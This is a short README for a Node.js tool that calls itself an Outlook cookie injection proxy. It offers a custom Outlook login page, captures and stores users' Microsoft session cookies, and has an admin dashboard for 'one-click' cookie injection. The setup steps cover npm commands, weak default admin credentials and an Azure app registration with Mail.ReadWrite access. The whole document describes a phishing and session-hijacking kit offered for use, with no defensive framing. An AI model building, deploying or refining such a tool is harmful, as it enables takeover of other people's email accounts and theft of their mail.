# Outlook Cookie Injection Proxy Server

A Node.js application that captures Microsoft Outlook cookies and provides admin functionality to inject them for seamless access.

## Features

- Custom Outlook login page
- Microsoft OAuth integration
- Cookie capture and storage
- Admin dashboard for user management
- One-click cookie injection
- Outlook Web App proxy

## Setup Instructions

1. **Install Dependencies**
   ```bash
   npm install
   ```

2. **Configure Environment**
   - Copy `.env.example` to `.env`
   - Update Microsoft App credentials in `.env`

3. **Setup Admin User**
   ```bash
   npm run setup
   ```

4. **Start Server**
   ```bash
   npm start
   ```

## Default Admin Credentials
- Email: admin@outlook-proxy.com
- Password: admin123

## Routes

- `/login` - User login page
- `/admin` - Admin dashboard
- `/admin/users` - User management
- `/proxy/outlook` - Outlook proxy

## Microsoft App Registration

1. Register app in Azure Portal
2. Set redirect URI: `http://localhost:8000/user/callback`
3. Add Mail.ReadWrite permissions
4. Update CLIENT_ID and CLIENT_SECRET in .env